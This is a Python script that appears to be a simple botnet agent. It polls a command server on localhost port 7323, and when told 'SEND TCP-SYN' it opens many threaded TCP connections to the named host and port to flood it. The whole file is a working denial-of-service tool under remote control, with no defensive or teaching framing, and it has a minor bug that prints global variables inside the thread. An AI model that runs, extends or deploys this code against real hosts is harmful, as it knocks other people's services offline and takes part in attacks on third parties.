import socket
import time
import threading

class Poison (threading.Thread):
    def __init__(self, threadID, url, port):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.threadID = threadID

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f'Connecting to {url}:{port}')

        sock.connect((self.url, self.port))

        time.sleep(1)

        sock.close()

def attack(url, port, n):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

while True:
    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master.connect(("localhost", 7323))

    res = master.recv(64)

    command = res.decode("utf-8")

    try:
        if command.startswith("SEND TCP-SYN"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n)
    except Exception as e:
        print("Error decoding command")
        print(e)
    master.close()
    time.sleep(3)
